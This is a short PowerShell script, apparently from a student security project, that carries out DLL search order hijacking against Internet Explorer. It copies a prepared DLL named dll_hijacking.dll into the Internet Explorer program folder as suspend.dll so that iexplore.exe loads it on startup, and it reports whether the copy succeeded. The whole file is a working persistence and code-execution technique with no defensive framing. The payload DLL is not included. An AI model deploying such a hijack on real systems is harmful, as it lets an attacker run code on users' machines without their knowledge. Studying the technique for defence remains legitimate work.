# [TECHNIQUE]: DLL Search Order Hijacking
# [TARGET]: Internet Explorer (iexplore.exe)
# [DLL]: suspend.dll
# [PRIVILEGE]: User
# [DESCRIPTION]: Drops a malicious DLL into the IE folder to be loaded on startup.

$iePath = "C:\Program Files\Internet Explorer"
$dllName = "suspend.dll"
$sourcePath = "C:\Users\abdul\Downloads\FYP\task1\dll_hijacking.dll"

# Check if we have write access to the folder (Program Files usually requires Admin)
if (Test-Path $iePath) {
    try {
        Copy-Item -Path $sourcePath -Destination "$iePath\$dllName" -ErrorAction Stop
        Write-Output "[SUCCESS] Hijack DLL deployed to $iePath"
    } catch {
        Write-Output "[FAILURE] Access Denied. Need Admin for Program Files."
    }
}